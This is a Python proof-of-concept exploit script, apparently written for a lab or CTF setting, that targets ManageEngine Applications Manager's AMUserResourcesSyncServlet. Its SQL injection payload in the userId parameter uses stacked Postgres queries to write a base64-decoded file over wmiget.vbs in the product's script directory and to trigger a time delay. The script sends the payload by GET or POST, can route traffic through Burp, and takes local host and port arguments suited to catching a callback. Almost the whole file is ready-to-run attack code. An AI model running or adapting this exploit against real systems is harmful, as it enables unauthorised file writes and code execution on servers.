#!/usr/bin/env python3
"""
exploit_probe.py
Improved proof-of-concept HTTP probe with SQL payload construction, optional Burp proxy,
timeouts, and safer printing / saving of responses.

Usage:
    python3 exploit_probe.py <rhost> [rport] [lhost] [lport] [websrv_port]
    Or use the flags (--post, --no-burp, --save <file>) for more control.
"""
import argparse
import subprocess
import sys
import time
from urllib.parse import quote

import requests
import urllib3

# ----- Config -----
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Toggleable runtime defaults
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
DEFAULT_TIMEOUT = 12  # seconds
DEFAULT_HTTPS_PORT = 443

# ANSI colors (small set)
YELLOW = "\033[33m"
DARK_WHITE = "\033[2;37m"
BLUE = "\033[34m"
RESET = "\033[0m"

# ----- Helpers -----
def print_banner_message(message):
    banner = f"{YELLOW}{{[+]}}{RESET}"
    print(f"{banner} {DARK_WHITE}{message}{RESET}")

def print_error_message(message):
    banner = f"{YELLOW}{{[+]}}{RESET}"
    print(f"{banner} {DARK_WHITE}{message}{RESET}")

def get_tun0_ip():
    """Return the IPv4 for tun0, or raise a RuntimeError."""
    try:
        result = subprocess.run(["ip", "address", "show", "dev", "tun0"],
                                capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError:
        raise RuntimeError("Failed to query tun0. Is the interface up?")
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    raise RuntimeError("No IP address found for tun0")

# ----- CLI -----
def parse_arguments():
    p = argparse.ArgumentParser(description="HTTP probe with injectable payload (PoC).")
    p.add_argument("rhost", help="Remote target host (IP or hostname)")
    p.add_argument("rport", nargs="?", type=int, default=DEFAULT_HTTPS_PORT,
                   help=f"Remote port (default: {DEFAULT_HTTPS_PORT} for HTTPS)")
    p.add_argument("lhost", nargs="?", default=None,
                   help="Local server IP to advertise (default: tun0 IP)")
    p.add_argument("lport", nargs="?", type=int, default=443, help="Local server port (default: 443)")
    p.add_argument("websrv_port", nargs="?", type=int, default=80, help="Local webserver port (default: 80)")
    p.add_argument("--no-burp", action="store_true", help="Don't route requests through Burp proxy")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout seconds (default {DEFAULT_TIMEOUT})")
    p.add_argument("--endpoint", default="/servlet/AMUserResourcesSyncServlet", help="Target endpoint (default AMUserResourcesSyncServlet)")
    p.add_argument("--post", action="store_true", help="Send payload as POST body instead of in querystring")
    p.add_argument("--save", metavar="FILE", help="Save full response body to FILE")
    p.add_argument("--quiet", action="store_true", help="Suppress verbose banners and only show minimal output")
    args = p.parse_args()

    if args.lhost is None:
        try:
            args.lhost = get_tun0_ip()
        except RuntimeError as e:
            print_error_message(str(e))
            sys.exit(1)

    return args

# ----- Payload / URL building -----
def build_payload():
    """
    The payload used in the PoC. Adjust as needed for your target.
    NOTE: Keep payloads small for GETs (URL length limits).
    """
    # Example: time-based + file-write COPY for Postgres on Windows (adjust to taste)
    return "1; COPY (SELECT convert_from(decode($$$$, $$base64$$), $$utf-8$$)) TO $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$; SELECT pg_sleep(10);--"

def build_url(rhost, rport, endpoint, encoded_payload):
    return f"https://{rhost}:{rport}{endpoint}?ForMasRange=1&userId={encoded_payload}"

# ----- Request sending -----
def send_request(url=None, post=False, post_body=None, timeout=DEFAULT_TIMEOUT, use_burp=True):
    proxies = BURP_PROXIES if use_burp else None
    try:
        start = time.time()
        if post:
            # Send as POST with content-type application/x-www-form-urlencoded
            r = requests.post(url, data=post_body, verify=False, proxies=proxies, timeout=timeout)
        else:
            r = requests.get(url, verify=False, proxies=proxies, timeout=timeout)
        elapsed = time.time() - start
        return {"response": r, "elapsed": elapsed}
    except requests.Timeout as e:
        return {"error": f"Timeout ({timeout}s): {e}"}
    except requests.RequestException as e:
        return {"error": f"Request error: {e}"}

# ----- Output helpers -----
def print_response_info(result, quiet=False):
    if "error" in result:
        print_error_message(result["error"])
        return

    r = result["response"]
    elapsed = result.get("elapsed", 0.0)
    if not quiet:
        print_banner_message(f"Request completed in {elapsed:.2f} seconds")

    # Print status line and headers
    status_line = f"HTTP/1.1 {r.status_code} {r.reason}"
    print(status_line)
    for k, v in r.headers.items():
        print(f"{k}: {v}")
    print()

    # Print truncated body for safety
    body = r.text or ""
    max_show = 4000
    if len(body) > max_show:
        print(body[:max_show])
        print("\n...[truncated]... (use --save to write full body to disk)")
    else:
        print(body)

def save_body_if_requested(result, save_path):
    if not save_path or "response" not in result:
        return
    try:
        with open(save_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(result["response"].text)
        print_banner_message(f"Saved full response body to: {save_path}")
    except Exception as e:
        print_error_message(f"Failed to save response: {e}")

# ----- Main flow -----
def main():
    args = parse_arguments()

    if not args.quiet:
        print_banner_message(f"Remote Host: {args.rhost}")
        print_banner_message(f"Remote Port: {args.rport}")
        print_banner_message(f"Server IP (lhost): {args.lhost}")
        print_banner_message(f"Server Port (lport): {args.lport}")
        print_banner_message(f"Web Server Port: {args.websrv_port}")
        print_banner_message(f"Endpoint: {args.endpoint}")
        print_banner_message(f"Using Burp: {not args.no_burp}")
        if args.post:
            print_banner_message("Mode: POST (payload in body)")
        else:
            print_banner_message("Mode: GET (payload in query)")

    # Build payload and encode it
    payload = build_payload()
    encoded_payload = quote(payload, safe='')  # encode everything for querystring safety

    if args.post:
        # If using POST, we will send the payload as the body (form-encoded)
        url = f"https://{args.rhost}:{args.rport}{args.endpoint}"
        post_body = {"ForMasRange": "1", "userId": payload}
        if not args.quiet:
            print_banner_message(f"Sending POST to: {url}")
    else:
        url = build_url(args.rhost, args.rport, args.endpoint, encoded_payload)
        post_body = None
        if not args.quiet:
            print_banner_message(f"Sending GET to: {url}")

    # Send the request
    result = send_request(url=url, post=args.post, post_body=post_body, timeout=args.timeout, use_burp=(not args.no_burp))

    # Print/save results
    print_response_info(result, quiet=args.quiet)
    if args.save:
        save_body_if_requested(result, args.save)

if __name__ == "__main__":
    main()
